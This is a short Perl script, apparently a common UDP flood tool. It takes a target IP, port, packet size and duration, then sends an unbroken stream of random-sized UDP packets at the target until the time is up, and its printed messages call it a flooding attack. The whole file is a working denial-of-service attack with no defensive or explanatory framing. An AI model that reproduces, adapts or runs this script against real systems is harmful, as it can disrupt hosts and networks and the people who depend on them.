#!/usr/bin/perl -w

 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " \n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Unable to connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Flooding in progress $ip with the port " . ($port ? $port : "random") . ",send to" . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " pour $time secondes" : "") . "\n";
print "Stopped with Ctrl -C attack\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}